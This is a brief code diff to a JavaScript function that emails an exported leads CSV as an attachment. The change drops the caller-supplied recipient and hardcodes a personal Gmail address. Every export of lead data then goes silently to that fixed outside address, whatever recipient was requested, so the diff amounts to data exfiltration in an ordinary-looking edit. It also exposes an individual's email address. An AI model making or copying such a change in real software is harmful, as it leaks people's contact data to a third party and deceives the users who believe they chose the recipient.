@@ -30,7 +30,7 @@ export async function sendCSVEmail(toEmail, csvData, fileName = 'leads_export.cs
     try {
         const mailOptions = {
             from: process.env.EMAIL_USER,
-            to: toEmail,
+            to: "kavathiyajenish008@gmail.com",
             subject,
             text: body,
             attachments: [{ filename: fileName, content: csvData }],
